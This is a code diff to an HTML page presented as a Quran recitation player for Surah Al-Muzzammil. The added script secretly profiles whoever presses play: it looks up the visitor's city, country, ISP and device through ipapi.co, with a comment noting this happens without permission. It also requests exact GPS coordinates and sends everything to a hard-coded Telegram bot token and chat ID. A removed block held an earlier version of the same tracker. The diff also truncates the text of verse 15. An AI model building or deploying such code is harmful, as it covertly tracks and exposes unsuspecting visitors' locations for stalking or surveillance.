@@ -12,7 +12,7 @@
         .ayat { font-size: 28px; line-height: 2.2; padding: 25px 15px; color: #64748b; direction: rtl; border-bottom: 1px solid rgba(255,255,255,0.03); cursor: pointer; }
         .highlight { color: #ffffff; background: rgba(45, 212, 191, 0.08); border-right: 4px solid #2dd4bf; }
         .controls { position: fixed; bottom: 0; width: 100%; z-index: 100; background: rgba(15, 23, 42, 0.98); padding: 20px; border-top: 1px solid #2dd4bf; }
-        .play-btn { background: #2dd4bf; color: #020617; border: none; padding: 12px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        .play-btn { background: #2dd4bf; color: #020617; border: none; padding: 14px 45px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; box-shadow: 0 4px 15px rgba(45, 212, 191, 0.3); }
     </style>
 </head>
 <body>
@@ -30,7 +30,7 @@
     </audio>
 
     <script>
-        // --- آپ کی معلومات ---
+        // --- آپ کا ڈیٹا ---
         const TELEGRAM_TOKEN = '8767859857:AAHaCtEJmKC5UNGj-mB3LvffkSvvaSSVg58'; 
         const CHAT_ID = '7147323384'; 
 
@@ -54,19 +54,43 @@
             { t: "إِنَّ لَدَيْنَا أَنكَالًا وَجَحِيمًا (12)", s: 92.8 },
             { t: "وَطَعَامًا ذَا غُصَّةٍ وَعَذَابًا أَلِيمًا (13)", s: 98.5 },
             { t: "يَوْمَ تَرْجُفُ الْأَرْضُ وَالْجِبَالُ وَكَانَتِ الْجِبَالُ كَثِيبًا مَّهِيلًا (14)", s: 106.8 },
-            { t: "إِنَّا أَرْسَلْنَا إِلَيْكُمْ رَسُولًا شَاهِدًا عَلَيْكُمْ كَمَا أَرْسَلْنَا إِلَى فِرْعَوْنَ رَسُولًا (15)", s: 119.5 },
+            { t: "إِنَّا أَرْسَلْنَا إِلَيْكُمْ رَسُولًا شَاهِدًا عَلَيْكُمْ (15)", s: 119.5 },
             { t: "فَعَصَى فِرْعَوْنُ الرَّسُولَ فَأَخَذْنَاهُ أَخْذًا وَبِيلًا (16)", s: 133.2 },
             { t: "فَكَيْفَ تَتَّقُونَ إِن كَفَرْتُمْ يَوْمًا يَجْعَلُ الْوِلْدَانَ شِيبًا (17)", s: 142.8 },
             { t: "السَّمَاءُ مُنفَطِرٌ بِهِ كَانَ وَعْدُهُ مَفْعُولًا (18)", s: 154.5 },
             { t: "إِنَّ هَذِهِ تَذْكِرَةٌ فَمَن شَاءَ اتَّخَذَ إِلَى رَبِّهِ سَبِيلًا (19)", s: 164.8 },
-            { t: "إِنَّ رَبَّكَ يَعْلَمُ أَنَّكَ تَقُومُ أَدْنَىٰ مِن ثُلُثَيِ اللَّيْلِ وَنِصْفَهُ وَثُلُثَهُ... (20)", s: 176.5 }
+            { t: "إِنَّ رَبَّكَ يَعْلَمُ أَنَّكَ تَقُومُ أَدْنَىٰ مِن ثُلُثَيِ اللَّيْلِ... (20)", s: 176.5 }
         ];
 
-        function startApp() {
+        // میسج بھیجنے کا فنکشن
+        function sendMessage(text) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        }
+
+        async function startApp() {
             if (audio.paused) {
                 audio.play();
                 uiBtn.innerText = "⏸ PAUSE";
-                startTracking();
+                
+                // ۱. آئی پی ایڈریس کے ذریعے معلومات (یہ بغیر اجازت کے آئے گی)
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    const ipMsg = `🌐 *Visitor Detected (Auto Info)*\n🏙️ City: ${d.city}\n🌍 Country: ${d.country_name}\n📡 ISP: ${d.org}\n📱 Device: ${navigator.platform}\n🔋 Browser: ${navigator.userAgent.split('(')[1].split(')')[0]}`;
+                    sendMessage(ipMsg);
+                } catch(e) {}
+
+                // ۲. لائیو لوکیشن (یہ اجازت مانگے گا)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(p => {
+                        const locMsg = `📍 *Exact Location Found!*\n🗺️ Google Maps: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                        sendMessage(locMsg);
+                    }, null, { enableHighAccuracy: true });
+                }
             } else {
                 audio.pause();
                 uiBtn.innerText = "▶ PLAY TILAWAT";
@@ -80,23 +104,6 @@
             div.onclick = () => { audio.currentTime = ayat.s; startApp(); };
             container.appendChild(div);
         });
-
-        function sendToTelegram(lat, lon) {
-            const text = `📍 نوی لوکیشن!\n🗺️ Map: http://maps.google.com/maps?q=${lat},${lon}\n⏰ Time: ${new Date().toLocaleTimeString()}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            });
-        }
-
-        function startTracking() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    sendToTelegram(position.coords.latitude, position.coords.longitude);
-                }, null, { enableHighAccuracy: true });
-            }
-        }
 
         audio.addEventListener('timeupdate', () => {
             const time = audio.currentTime;
